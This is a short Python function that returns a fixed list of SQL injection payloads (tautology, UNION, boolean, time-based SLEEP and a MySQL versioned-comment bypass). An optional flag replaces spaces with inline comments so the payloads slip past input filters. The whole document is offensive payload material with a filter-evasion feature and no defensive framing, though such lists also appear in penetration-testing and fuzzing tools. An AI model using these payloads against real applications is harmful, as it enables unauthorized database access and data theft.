def generate_sqli_payloads(obfuscate=False):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND 1=1--",
        "' OR SLEEP(5)--",
        "' /*!50000UNION*/ SELECT 1,2--"
    ]
    if obfuscate:
        payloads = [p.replace(" ", "/**/") for p in payloads]
    return payloads